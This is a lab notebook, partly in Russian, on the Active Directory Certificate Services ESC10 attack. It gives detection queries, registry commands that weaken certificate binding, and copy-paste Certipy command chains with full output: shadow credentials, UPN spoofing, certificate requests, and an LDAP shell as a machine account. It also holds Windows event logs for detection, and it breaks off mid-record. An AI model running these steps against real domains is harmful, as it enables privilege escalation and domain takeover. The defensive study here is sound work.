# ESC10
# Sources

[https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7](https://research.ifcr.dk/certipy-4-0-esc9-esc10-bloodhound-gui-new-authentication-and-request-methods-and-more-7237d88061f7)

[https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16](https://support.microsoft.com/en-us/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16)

# Hunts

### Changing certificate mapping settings
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*Services\\Kdc* AND winlog.event_data.ObjectValueName:"StrongCertificateBindingEnforcement"
```
```sql
winlog.event_id:4657 AND winlog.event_data.ObjectName:*SecurityProviders\\SCHANNEL* AND winlog.event_data.ObjectValueName:"CertificateMappingMethods"
```

### Event 41 System
```sql
winlog.channel:"System" AND winlog.provider_name:"Microsoft-Windows-Kerberos-Key-Distribution-Center" AND winlog.event_id:41
```

### 4624 Schannel+Microsoft Unified Security Protocol Provider
```sql
winlog.event_id:4624 AND winlog.event_data.LogonProcessName:"Schannel" AND winlog.event_data.AuthenticationPackageName:"Microsoft Unified Security Protocol Provider" AND winlog.event_data.TargetUserName:/.+$/
```

### UPN with host account
```sql
(
    winlog.event_id:5136 AND 
    winlog.event_data.AttributeLDAPDisplayName:"userPrincipalName" AND 
    winlog.event_data.AttributeValue:*$*
) 
OR 
(
    winlog.event_id:4738 AND 
    winlog.event_data.UserPrincipalName:*$*
)
```


# Commands

## Case #1 (**StrongCertificateBindingEnforcement 0**)

```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 0
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 0

New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name 'CertificateMappingMethods' -PropertyType Dword -Value 0x18
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name 'CertificateMappingMethods' -Value 0x18
```
Version with explanations
```bash
source certipy-venv/bin/activate

## missandei@essos.local has Generic Write on viserys.targaryen. Shadow cred to get NT hash of viserys.targaryen 
certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12

## Change UPN of viserys.targaryen to Administrator. Works because there is no Administrator UPN, just Administrator@test.local
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12

## Certificate request
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'User'

## Change back
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen -dc-ip 192.168.56.12

## Auth as Administrator
certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

```
Short version, ready for full copy-paste
```bash
source certipy-venv/bin/activate
certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'User'
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen -dc-ip 192.168.56.12
certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

```

### 1. Shadow Credentials

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'viserys.targaryen'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b83a2595dce14fe58474422245fbe449'
[*] Adding Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Successfully added Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Authenticating as 'viserys.targaryen' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'viserys.targaryen@essos.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'viserys.targaryen.ccache'
[*] Wrote credential cache to 'viserys.targaryen.ccache'
[*] Trying to retrieve NT hash for 'viserys.targaryen'
[*] Restoring the old Key Credentials for 'viserys.targaryen'
[*] Successfully restored the old Key Credentials for 'viserys.targaryen'
[*] NT hash for 'viserys.targaryen': d96a55df6bef5e0b4d6d956088036097

```

### 2. Change  UPN to Administrator

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn administrator -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : administrator
[*] Successfully updated 'viserys.targaryen'

```

### 3. Request certificate

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'user'
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '192.168.56.12'
[+] DC IP: '192.168.56.12'
[+] DC Host: 'ESSOS.LOCAL'
[+] Target IP: None
[+] Remote Name: 'braavos.essos.local'
[+] Domain: 'ESSOS.LOCAL'
[+] Username: 'VISERYS.TARGARYEN'
[+] Trying to resolve 'braavos.essos.local' at '192.168.56.12'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[*] Request ID is 3
[*] Successfully requested certificate
[*] Got certificate with UPN 'administrator'
[*] Certificate has no object SID
[*] Try using -sid to set the object SID or see the wiki for more details
[*] Saving certificate and private key to 'administrator.pfx'
[+] Attempting to write data to 'administrator.pfx'
[+] Data written to 'administrator.pfx'
[*] Wrote certificate and private key to 'administrator.pfx'

```

### 4. Rollback UPN to viserys.targaryen

```bash                                                                                                                            
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen@essos.local -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : viserys.targaryen
[*] Successfully updated 'viserys.targaryen'
```

### 5. Auth as Administrator using cert on DC03

Disabled mode не работает с апредя 2023 года.

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx 'administrator.pfx' -domain "essos.local" -dc-ip 192.168.56.12

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'administrator'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1114'
[*] Using principal: 'administrator@essos.local'
[*] Trying to get TGT...
[-] Object SID mismatch between certificate and user 'administrator'
[-] Verify that user 'administrator' has object SID 'S-1-5-21-666199682-1411342147-2938717855-1114'
[-] See the wiki for more information

```

## Case #2 (CertificateMappingMethods **0x4**)

Работает с любым аккаунтом без UPN (машинные УЗ) и аккаунтом у которого отличаются `userPrincipalName` и `sAMAccountName` 

```powershell
New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -PropertyType Dword -Value 2
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Services\Kdc" -Name 'StrongCertificateBindingEnforcement' -Value 2

New-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name 'CertificateMappingMethods' -PropertyType Dword -Value 0x4
Set-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\SecurityProviders\SCHANNEL" -Name 'CertificateMappingMethods' -Value 0x4
```
Версия с пояснениями
```bash
source certipy-venv/bin/activate

## missandei@essos.local has Generic Write on viserys.targaryen. Shadow cred to get NT hash of viserys.targaryen 
certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12

## Change UPN of viserys.targaryen to Administrator. Works because there is no UPN in machine accounts
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn 'meereen$@essos.local'-dc-ip 192.168.56.12

## Certificate request
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'User'

## Change back
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen -dc-ip 192.168.56.12

## Auth as meereen$ using Schannel
certipy auth -pfx 'meereen.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -ldap-shell

```
Краткая версия, которую можно полностью копировать и вставить
```bash
source certipy-venv/bin/activate
certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn 'meereen$@essos.local' -dc-ip 192.168.56.12
certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'User'
certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen -dc-ip 192.168.56.12
certipy auth -pfx 'meereen.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -ldap-shell
```

### 1. Shadow Credentials

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy shadow auto -username "missandei@essos.local" -p "fr3edom" -account viserys.targaryen -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Targeting user 'viserys.targaryen'
[*] Generating certificate
[*] Certificate generated
[*] Generating Key Credential
[*] Key Credential generated with DeviceID 'b83a2595dce14fe58474422245fbe449'
[*] Adding Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Successfully added Key Credential with device ID 'b83a2595dce14fe58474422245fbe449' to the Key Credentials for 'viserys.targaryen'
[*] Authenticating as 'viserys.targaryen' with the certificate
[*] Certificate identities:
[*]     No identities found in this certificate
[*] Using principal: 'viserys.targaryen@essos.local'
[*] Trying to get TGT...
[*] Got TGT
[*] Saving credential cache to 'viserys.targaryen.ccache'
[*] Wrote credential cache to 'viserys.targaryen.ccache'
[*] Trying to retrieve NT hash for 'viserys.targaryen'
[*] Restoring the old Key Credentials for 'viserys.targaryen'
[*] Successfully restored the old Key Credentials for 'viserys.targaryen'
[*] NT hash for 'viserys.targaryen': d96a55df6bef5e0b4d6d956088036097

```

### 2. Change  UPN to Administrator

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn 'meereen$@essos.local' -dc-ip 192.168.56.12
Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : meereen$@essos.local
[*] Successfully updated 'viserys.targaryen'

```

### 3. Request certificate

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy -debug req -username "viserys.targaryen@essos.local" -hashes "d96a55df6bef5e0b4d6d956088036097" -dc-ip '192.168.56.12' -target "braavos.essos.local" -ca 'ESSOS-CA' -template 'User'

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[+] DC host (-dc-host) not specified. Using domain as DC host
[+] Nameserver: '192.168.56.12'
[+] DC IP: '192.168.56.12'
[+] DC Host: 'ESSOS.LOCAL'
[+] Target IP: None
[+] Remote Name: 'braavos.essos.local'
[+] Domain: 'ESSOS.LOCAL'
[+] Username: 'VISERYS.TARGARYEN'
[+] Trying to resolve 'braavos.essos.local' at '192.168.56.12'
[+] Generating RSA key
[*] Requesting certificate via RPC
[+] Trying to connect to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[+] Connected to endpoint: ncacn_np:192.168.56.23[\pipe\cert]
[*] Request ID is 16
[*] Successfully requested certificate
[*] Got certificate with UPN 'meereen$@essos.local'
[+] Found SID in security extension: 'S-1-5-21-666199682-1411342147-2938717855-1114'
[*] Certificate object SID is 'S-1-5-21-666199682-1411342147-2938717855-1114'
[*] Saving certificate and private key to 'meereen.pfx'
[+] Attempting to write data to 'meereen.pfx'
File 'meereen.pfx' already exists. Overwrite? (y/n - saying no will save with a unique filename): y
[+] Data written to 'meereen.pfx'
[*] Wrote certificate and private key to 'meereen.pfx'
                                                                          
```

### 4. Rollback UPN to viserys.targaryen

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy account update -username "missandei@essos.local" -p "fr3edom" -user viserys.targaryen -upn viserys.targaryen@essos.local -dc-ip 192.168.56.12

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Updating user 'viserys.targaryen':
    userPrincipalName                   : viserys.targaryen@essos.local
[*] Successfully updated 'viserys.targaryen'
```

### 5. Auth as Administrator using cert on DC03

```bash
┌──(certipy-venv)─(kali㉿kali)-[~]
└─$ certipy auth -pfx 'meereen.pfx' -domain "essos.local" -dc-ip 192.168.56.12 -ldap-shell                                                                                                   

Certipy v5.0.3 - by Oliver Lyak (ly4k)

[*] Certificate identities:
[*]     SAN UPN: 'meereen$@essos.local'
[*]     Security Extension SID: 'S-1-5-21-666199682-1411342147-2938717855-1114'
[*] Connecting to 'ldaps://192.168.56.12:636'
[*] Authenticated to '192.168.56.12' as: 'u:ESSOS\\MEEREEN$'
Type help for list of commands

# whoami
u:ESSOS\MEEREEN$
```

# Artifacts

## StrongCertificateBindingEnforcement=0

### 4657 Change registry StrongCertificateBindingEnforcement
```
A registry value was modified.

Subject:
	Security ID:		ESSOS\daenerys.targaryen
	Account Name:		daenerys.targaryen
	Account Domain:		ESSOS
	Logon ID:		0x89DA2

Object:
	Object Name:		\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Kdc
	Object Value Name:	StrongCertificateBindingEnforcement
	Handle ID:		0xb70
	Operation Type:		Existing registry value modified

Process Information:
	Process ID:		0x60c
	Process Name:		C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe

Change Information:
	Old Value Type:		REG_DWORD
	Old Value:		1
	New Value Type:		REG_DWORD
	New Value:		0
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4657</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>12801</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-17T18:33:29.770171500Z" /> 
  <EventRecordID>144601</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="4" ThreadID="2636" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1113</Data> 
  <Data Name="SubjectUserName">daenerys.targaryen</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0x89da2</Data> 
  <Data Name="ObjectName">\REGISTRY\MACHINE\SYSTEM\ControlSet001\Services\Kdc</Data> 
  <Data Name="ObjectValueName">StrongCertificateBindingEnforcement</Data> 
  <Data Name="HandleId">0xb70</Data> 
  <Data Name="OperationType">%%1905</Data> 
  <Data Name="OldValueType">%%1876</Data> 
  <Data Name="OldValue">1</Data> 
  <Data Name="NewValueType">%%1876</Data> 
  <Data Name="NewValue">0</Data> 
  <Data Name="ProcessId">0x60c</Data> 
  <Data Name="ProcessName">C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data> 
  </EventData>
  </Event>
```

### 5136 UPN Change
```
A directory service object was modified.
	
Subject:
	Security ID:		ESSOS\missandei
	Account Name:		missandei
	Account Domain:		ESSOS
	Logon ID:		0xE7154B

Directory Service:
	Name:	essos.local
	Type:	Active Directory Domain Services
	
Object:
	DN:	CN=viserys.targaryen,CN=Users,DC=essos,DC=local
	GUID:	CN=viserys.targaryen,CN=Users,DC=essos,DC=local
	Class:	user
	
Attribute:
	LDAP Display Name:	userPrincipalName
	Syntax (OID):	2.5.5.12
	Value:	administrator
	
Operation:
	Type:	Value Added
	Correlation ID:	{b88f1180-17c3-4bc6-b3f8-7290e6225572}
	Application Correlation ID:	-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>5136</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>14081</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:50:29.387272900Z" /> 
  <EventRecordID>148486</EventRecordID> 
  <Correlation ActivityID="{388C4309-0EB8-0001-5643-8C38B80EDC01}" /> 
  <Execution ProcessID="684" ThreadID="4320" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="OpCorrelationID">{B88F1180-17C3-4BC6-B3F8-7290E6225572}</Data> 
  <Data Name="AppCorrelationID">-</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1117</Data> 
  <Data Name="SubjectUserName">missandei</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xe7154b</Data> 
  <Data Name="DSName">essos.local</Data> 
  <Data Name="DSType">%%14676</Data> 
  <Data Name="ObjectDN">CN=viserys.targaryen,CN=Users,DC=essos,DC=local</Data> 
  <Data Name="ObjectGUID">{22B9DCC6-D44E-48DB-8443-C106E0B085AE}</Data> 
  <Data Name="ObjectClass">user</Data> 
  <Data Name="AttributeLDAPDisplayName">userPrincipalName</Data> 
  <Data Name="AttributeSyntaxOID">2.5.5.12</Data> 
  <Data Name="AttributeValue">administrator</Data> 
  <Data Name="OperationType">%%14674</Data> 
  </EventData>
  </Event>
```

### 4738 UPN Change
```
A user account was changed.

Subject:
	Security ID:		ESSOS\missandei
	Account Name:		missandei
	Account Domain:		ESSOS
	Logon ID:		0xE7154B

Target Account:
	Security ID:		ESSOS\viserys.targaryen
	Account Name:		viserys.targaryen
	Account Domain:		ESSOS

Changed Attributes:
	SAM Account Name:	-
	Display Name:		-
	User Principal Name:	administrator
	Home Directory:		-
	Home Drive:		-
	Script Path:		-
	Profile Path:		-
	User Workstations:	-
	Password Last Set:	-
	Account Expires:		-
	Primary Group ID:	-
	AllowedToDelegateTo:	-
	Old UAC Value:		-
	New UAC Value:		-
	User Account Control:	-
	User Parameters:	-
	SID History:		-
	Logon Hours:		-

Additional Information:
	Privileges:		-
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4738</EventID> 
  <Version>0</Version> 
  <Level>0</Level> 
  <Task>13824</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-18T18:50:29.295668800Z" /> 
  <EventRecordID>148481</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="684" ThreadID="2592" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="Dummy">-</Data> 
  <Data Name="TargetUserName">viserys.targaryen</Data> 
  <Data Name="TargetDomainName">ESSOS</Data> 
  <Data Name="TargetSid">S-1-5-21-666199682-1411342147-2938717855-1114</Data> 
  <Data Name="SubjectUserSid">S-1-5-21-666199682-1411342147-2938717855-1117</Data> 
  <Data Name="SubjectUserName">missandei</Data> 
  <Data Name="SubjectDomainName">ESSOS</Data> 
  <Data Name="SubjectLogonId">0xe7154b</Data> 
  <Data Name="PrivilegeList">-</Data> 
  <Data Name="SamAccountName">-</Data> 
  <Data Name="DisplayName">-</Data> 
  <Data Name="UserPrincipalName">administrator</Data> 
  <Data Name="HomeDirectory">-</Data> 
  <Data Name="HomePath">-</Data> 
  <Data Name="ScriptPath">-</Data> 
  <Data Name="ProfilePath">-</Data> 
  <Data Name="UserWorkstations">-</Data> 
  <Data Name="PasswordLastSet">-</Data> 
  <Data Name="AccountExpires">-</Data> 
  <Data Name="PrimaryGroupId">-</Data> 
  <Data Name="AllowedToDelegateTo">-</Data> 
  <Data Name="OldUacValue">-</Data> 
  <Data Name="NewUacValue">-</Data> 
  <Data Name="UserAccountControl">-</Data> 
  <Data Name="UserParameters">-</Data> 
  <Data Name="SidHistory">-</Data> 
  <Data Name="LogonHours">-</Data> 
  </EventData>
  </Event>
```

### System event 41

```
The Key Distribution Center (KDC) encountered a user certificate that was valid but contained a different SID than the user to which it mapped. As a result, the request involving the certificate failed. See https://go.microsoft.com/fwlink/?linkid=2189925 to learn more.

User: Administrator
User SID: S-1-5-21-666199682-1411342147-2938717855-500
Certificate Subject: @@@CN=viserys.targaryen, CN=Users, DC=essos, DC=local
Certificate Issuer: ESSOS-CA
Certificate Serial Number: 20000000149241A5D99E294FD6000000000014
Certificate Thumbprint: 9DAE1287FD1479E3E90340B66C626DCC9FB9D5FB
Certificate SID: S-1-5-21-666199682-1411342147-2938717855-1114
```
```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Kerberos-Key-Distribution-Center" Guid="{3FD9DA1A-5A54-46C5-9A26-9BD7C0685056}" EventSourceName="KDC" /> 
  <EventID Qualifiers="32768">41</EventID> 
  <Version>0</Version> 
  <Level>2</Level> 
  <Task>0</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x80000000000000</Keywords> 
  <TimeCreated SystemTime="2025-08-08T21:54:04.567936700Z" /> 
  <EventRecordID>5891</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="0" ThreadID="0" /> 
  <Channel>System</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="AccountName">Administrator</Data> 
  <Data Name="AccountSid">S-1-5-21-666199682-1411342147-2938717855-500</Data> 
  <Data Name="Subject">@@@CN=viserys.targaryen, CN=Users, DC=essos, DC=local</Data> 
  <Data Name="Issuer">ESSOS-CA</Data> 
  <Data Name="SerialNumber">20000000149241A5D99E294FD6000000000014</Data> 
  <Data Name="Thumbprint">9DAE1287FD1479E3E90340B66C626DCC9FB9D5FB</Data> 
  <Data Name="CertificateSid">S-1-5-21-666199682-1411342147-2938717855-1114</Data> 
  <Binary /> 
  </EventData>
  </Event>
```

### 4768 Failed TGT Request (KRB_AP_ERR_USER_TO_USER_REQUIRED)
```
 A Kerberos authentication ticket (TGT) was requested.
 
 
 Account Information:
 Account Name:		administrator
 Supplied Realm Name:	ESSOS.LOCAL
 User ID:			NULL SID
 MSDS-SupportedEncryptionTypes:	-
 Available Keys:	-
 
 Service Information:
 Service Name:		krbtgt/ESSOS.LOCAL
 Service ID:		NULL SID
 MSDS-SupportedEncryptionTypes:	-
 Available Keys:	-
 
 Domain Controller Information:
 MSDS-SupportedEncryptionTypes:	-
 Available Keys:	-
 
 Network Information:
 Client Address:		::ffff:192.168.56.101
 Client Port:		61350
 Advertized Etypes:	-
 
 Additional Information:
 Ticket Options:		0x40800010
 Result Code:		0x42
 Ticket Encryption Type:	0xFFFFFFFF
 Session Encryption Type:	0x2D
 Pre-Authentication Type:	-
 Pre-Authentication EncryptionType:	0x2D
 
 Certificate Information:
 Certificate Issuer Name:		ESSOS-CA
 Certificate Serial Number:	20000000149241A5D99E294FD6000000000014
 Certificate Thumbprint:		9DAE1287FD1479E3E90340B66C626DCC9FB9D5FB
 
 Ticket information
 Response ticket hash:		-
 Certificate information is only provided if a certificate was used for pre-authentication.
 
 Pre-authentication types, ticket options, encryption types and result codes are defined in RFC 4120.
``` 

```jsx
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-A5BA-3E3B0328C30D}" /> 
  <EventID>4768</EventID> 
  <Version>2</Version> 
  <Level>0</Level> 
  <Task>14339</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8010000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:20:02.499094200Z" /> 
  <EventRecordID>60818</EventRecordID> 
  <Correlation /> 
  <Execution ProcessID="580" ThreadID="5100" /> 
  <Channel>Security</Channel> 
  <Computer>meereen.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="TargetUserName">administrator</Data> 
  <Data Name="TargetDomainName">ESSOS.LOCAL</Data> 
  <Data Name="TargetSid">S-1-0-0</Data> 
  <Data Name="ServiceName">krbtgt/ESSOS.LOCAL</Data> 
  <Data Name="ServiceSid">S-1-0-0</Data> 
  <Data Name="TicketOptions">0x40800010</Data> 
  <Data Name="Status">0x42</Data> 
  <Data Name="TicketEncryptionType">0xffffffff</Data> 
  <Data Name="PreAuthType">-</Data> 
  <Data Name="IpAddress">::ffff:192.168.56.101</Data> 
  <Data Name="IpPort">61350</Data> 
  <Data Name="CertIssuerName">ESSOS-CA</Data> 
  <Data Name="CertSerialNumber">20000000149241A5D99E294FD6000000000014</Data> 
  <Data Name="CertThumbprint">9DAE1287FD1479E3E90340B66C626DCC9FB9D5FB</Data> 
  <Data Name="ResponseTicket">-</Data> 
  <Data Name="AccountSupportedEncryptionTypes">-</Data> 
  <Data Name="AccountAvailableKeys">-</Data> 
  <Data Name="ServiceSupportedEncryptionTypes">-</Data> 
  <Data Name="ServiceAvailableKeys">-</Data> 
  <Data Name="DCSupportedEncryptionTypes">-</Data> 
  <Data Name="DCAvailableKeys">-</Data> 
  <Data Name="ClientAdvertizedEncryptionTypes">-</Data> 
  <Data Name="SessionKeyEncryptionType">0x2d</Data> 
  <Data Name="PreAuthEncryptionType">0x2d</Data> 
  </EventData>
  </Event>
```

### 4886 Certificate Request
```
 Certificate Services received a certificate request.
 
 
 Request ID:	20
 Requester:	ESSOS\viserys.targaryen
 Attributes:	CertificateTemplate:User
 Subject from CSR:	CN=Viserys.targaryen
 Subject Alternative Name from CSR:
 
 Requested Template:	User
 RequestOSVersion:	
 RequestCSPProvider:	
 RequestClientInfo:	
 Authentication Service:	NTLM
 Authentication Level:	Privacy
 DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4886</EventID> 
  <Version>1</Version> 
  <Level>0</Level> 
  <Task>12805</Task> 
  <Opcode>0</Opcode> 
  <Keywords>0x8020000000000000</Keywords> 
  <TimeCreated SystemTime="2025-07-28T18:19:59.7575330Z" /> 
  <EventRecordID>31467</EventRecordID> 
  <Correlation ActivityID="{aba101cc-ff1e-0001-3703-a1ab1effdb01}" /> 
  <Execution ProcessID="668" ThreadID="716" /> 
  <Channel>Security</Channel> 
  <Computer>braavos.essos.local</Computer> 
  <Security /> 
  </System>
- <EventData>
  <Data Name="RequestId">20</Data> 
  <Data Name="Requester">ESSOS\viserys.targaryen</Data> 
  <Data Name="Attributes">CertificateTemplate:User</Data> 
  <Data Name="Subject">CN=Viserys.targaryen</Data> 
  <Data Name="SubjectAlternativeName" /> 
  <Data Name="CertificateTemplate">User</Data> 
  <Data Name="RequestOSVersion" /> 
  <Data Name="RequestCSPProvider" /> 
  <Data Name="RequestClientInfo" /> 
  <Data Name="AuthenticationService">NTLM</Data> 
  <Data Name="AuthenticationLevel">Privacy</Data> 
  <Data Name="DCOMorRPC">RPC</Data> 
  </EventData>
  </Event>
```

### 4887 Issued Certificate
```
 Certificate Services approved a certificate request and issued a certificate.
 
 
 Request ID:	20
 Requester:	ESSOS\viserys.targaryen
 Attributes:	CertificateTemplate:User
 Disposition:	3
 SKI:		ce 95 ab 7b 05 17 75 4a 9d e3 6a 4a 18 ad fa 03 a1 26 c8 7d
 Subject:	CN=viserys.targaryen, CN=Users, DC=essos, DC=local
 Subject Alternative Name:
 Other Name:
 Principal Name=administrator
 
 Certificate Template:	User
 Serial Number:		20000000149241a5d99e294fd6000000000014
 Authentication Service:	NTLM
 Authentication Level:	Privacy
 DCOMorRPC:		RPC
```

```xml
- <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
- <System>
  <Provider Name="Microsoft-Windows-Security-Auditing" Guid="{54849625-5478-4994-a5ba-3e3b0328c30d}" /> 
  <EventID>4887</EventID> 
  <Version>1</Version> 
